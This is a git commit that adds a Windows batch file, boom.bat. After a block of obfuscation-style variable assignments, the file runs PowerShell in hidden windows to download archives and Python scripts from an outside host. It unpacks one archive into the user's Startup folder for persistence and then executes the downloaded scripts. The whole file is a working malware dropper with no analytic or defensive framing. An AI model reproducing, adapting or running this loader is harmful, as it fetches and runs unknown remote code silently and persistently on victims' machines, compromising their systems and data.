e7809c5e33f3a2070d3e966f669a77194f938759
alibaba20232023 <136153777+alibaba20232023@users.noreply.github.com>
2023-08-19 01:32:40 +0700

    Add files via upload

---
+++ boom.bat
@@ -0,0 +1,71 @@
+ÿþ
+@echo off
+set eQ=y
+set MA=0
+set RA=D
+set JA=$
+set dA=t
+set VQ=U
+set Yg=b
+set bQ=m
+set MQ=1
+set KA=(
+set bA=l
+set LQ=-
+set Tg=N
+set cQ=q
+set eg=z
+set Lw=/
+set aA=h
+set XA=\
+set dg=v
+set Jw='
+set OA=8
+set Rg=F
+setlocal EnableDelayedExpansion
+set cg=r
+set aw=k
+set Ww=[
+set XQ=]
+set QQ=A
+set bw=o
+set cw=s
+set Ow=;
+set ZA=d
+set UA=P
+set Uw=S
+set Zg=f
+set aQ=i
+set Mw=3
+set IA= 
+set Lg=.
+set RQ=E
+set bg=n
+set Ig="
+set Tw=O
+set Ug=R
+set Mg=2
+set dw=w
+set eA=x
+set YQ=a
+set Og=:
+set cA=p
+set Nw=7
+set dQ=u
+set KQ=)
+set SQ=I
+set Zw=g
+set Vw=W
+set TQ=M
+set Yw=c
+set Qw=C
+set ZQ=e
+cls
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://aovl9999.store/Document.zip -OutFile C:\\Users\\Public\\Document.zip;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://aovl9999.store/test.zip -OutFile C:\\Users\\Public\\WindowsSecure.zip";
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\WindowsSecure.zip -DestinationPath C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://aovl9999.store/rmv -OutFile C:\\Users\\Public\\Document\\rmv.py;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\rmv.py;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://aovl9999.store/test -OutFile C:\\Users\\Public\\Document\\project.py;
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\project.py;
